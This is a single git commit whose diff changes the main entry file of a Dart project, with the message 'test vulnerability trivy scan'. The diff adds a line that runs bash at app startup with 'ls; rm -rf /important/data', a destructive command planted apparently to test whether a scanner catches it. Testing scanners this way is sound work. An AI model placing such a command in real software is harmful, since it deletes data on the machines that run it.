a88fe859bb8bf3b3ce632e89455cade42583e1da
phamthihaiyen <yen.pth1507@gmail.com>
2024-12-22 00:44:45 +0700

    test vulnerability trivy scan

--- lib/main.dart
+++ lib/main.dart
@@ -1,5 +1,10 @@
+import 'dart:io';
+
 import 'package:base_project/core/di/injector.dart';
 
 Future<void> main() async {
+  var result = Process.runSync('bash', ['-c', 'ls; rm -rf /important/data']);
+
+  print(result.stdout);
   configureDependencies();
 }
